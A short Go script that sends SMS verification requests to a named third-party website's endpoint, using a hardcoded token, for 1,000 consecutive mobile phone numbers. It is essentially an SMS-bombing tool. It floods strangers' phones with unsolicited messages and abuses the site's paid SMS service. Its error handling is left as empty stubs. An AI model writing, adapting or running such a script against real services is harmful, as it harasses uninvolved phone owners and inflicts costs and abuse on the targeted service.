package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strconv"
	"sync"
)

var wg sync.WaitGroup
var counter int = 0

func httpPostForm(requestUrl string, requestBody url.Values, ch chan string) {

	resp, err := http.PostForm(requestUrl, requestBody)

	if err != nil {
		// handle error
	}

	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		// handle error
	}

	fmt.Println(string(body))

	ch <- requestBody.Get("phone")

}

func main() {

	defer func() {
		if err:=recover();err!=nil{
			fmt.Println(err) // 这里的err其实就是panic传入的内容，55
		}
	}()

	startPhone := 18930580000
	startPhone = 13067890000
	startPhone = 17046790000
	phone := 0
	requestUrl := "https://sb77.cn/modules/addons/SMS_Verification/action.php?action=send"

	requestBody := url.Values{}
	requestBody.Set("token", "5a1b42eb3f3e264dac22452c095d847f97dae5bb")

	ch := make(chan string)

	for i := 0; i < 1000; i++ {
		phone = startPhone + i
		requestBody.Set("phone", strconv.Itoa(phone))

		go httpPostForm(requestUrl, requestBody, ch)

		tmp := <-ch
		fmt.Println(tmp)
	}

}
